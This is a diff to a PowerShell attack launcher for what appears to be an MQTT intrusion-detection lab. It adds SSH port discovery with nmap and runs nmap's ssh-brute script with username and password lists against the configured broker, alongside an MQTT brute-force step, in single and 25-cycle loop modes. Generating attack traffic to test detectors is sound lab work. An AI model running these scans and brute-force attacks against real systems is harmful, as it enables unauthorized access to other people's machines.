@@ -1,5 +1,5 @@
 # ============================================================
-# MQTT IDS LAB - FULL ATTACK SCRIPT
+# MQTT IDS LAB - FULL ATTACK SCRIPT (Improved SSH Detection)
 # ============================================================
 
 $ProjectRoot = Split-Path $PSScriptRoot -Parent
@@ -11,6 +11,9 @@ $TARGET = $NetConfig.broker_ip
 $USERS      = Join-Path $PSScriptRoot "users.txt"
 $PASSWORDS  = Join-Path $PSScriptRoot "passwords.txt"
 $MQTT_BRUTE = Join-Path $PSScriptRoot "mqtt_bruteforce.py"
+
+# Common SSH ports to test
+$CommonSSHPorts = "22,2222,2200,2022,8022,222,9922,10022"
 
 Write-Host "============================================================" -ForegroundColor Yellow
 Write-Host "                MQTT IDS LAB - ATTACK LAUNCHER              " -ForegroundColor Cyan
@@ -24,6 +27,42 @@ Write-Host " [3] Exit"
 Write-Host ""
 
 $choice = Read-Host "Enter your choice"
+
+# ------------------------------------------
+# FUNCTION: Detect SSH port before brute-force
+# ------------------------------------------
+function Find-SSHPorts {
+    Write-Host "`n[SCAN] Detecting SSH service on common ports..." -ForegroundColor Yellow
+    $ScanOutput = nmap -sV -p $CommonSSHPorts $TARGET
+
+    $FoundSSH = ($ScanOutput | Select-String -Pattern "ssh" -SimpleMatch) |
+        ForEach-Object {
+            ($_ -split "/")[0].Trim()
+        }
+
+    return $FoundSSH
+}
+
+# ------------------------------------------
+# FUNCTION: Run ssh-brute on detected ports
+# ------------------------------------------
+function Run-SSHBrute {
+    $SSHPorts = Find-SSHPorts
+
+    if ($SSHPorts.Count -eq 0) {
+        Write-Host "`n[INFO] No SSH service found. Skipping SSH brute-force." -ForegroundColor DarkYellow
+        return
+    }
+
+    Write-Host "`n[INFO] SSH Detected on: $($SSHPorts -join ', ')" -ForegroundColor Green
+
+    foreach ($Port in $SSHPorts) {
+        Write-Host "`n[SSH Bruteforce] Running ssh-brute on port $Port..." -ForegroundColor Yellow
+
+        nmap -p $Port --script ssh-brute `
+            --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET
+    }
+}
 
 switch ($choice) {
 
@@ -43,7 +82,7 @@ switch ($choice) {
     Start-Sleep -Seconds 3
 
     Write-Host "`n[3] SSH Bruteforce..." -ForegroundColor Yellow
-    nmap --script ssh-brute --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET
+    Run-SSHBrute
     Start-Sleep -Seconds 3
 
     Write-Host "`n[4] MQTT Bruteforce..." -ForegroundColor Yellow
@@ -57,7 +96,6 @@ switch ($choice) {
 # OPTION 2: CONTINUOUS LOOP
 # -------------------------------------------------------------
 "2" {
-
     $LOOP_COUNT = 25
     Write-Host "`nRunning $LOOP_COUNT attack cycles..." -ForegroundColor Cyan
 
@@ -76,7 +114,7 @@ switch ($choice) {
         Start-Sleep -Seconds 3
 
         Write-Host "`n[3] SSH Bruteforce..." -ForegroundColor Yellow
-        nmap --script ssh-brute --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET
+        Run-SSHBrute
         Start-Sleep -Seconds 3
 
         Write-Host "`n[4] MQTT Bruteforce..." -ForegroundColor Yellow
@@ -91,7 +129,7 @@ switch ($choice) {
 }
 
 # -------------------------------------------------------------
-# EXIT
+# EXIT OPTION
 # -------------------------------------------------------------
 "3" {
     Write-Host "Exiting..." -ForegroundColor Yellow
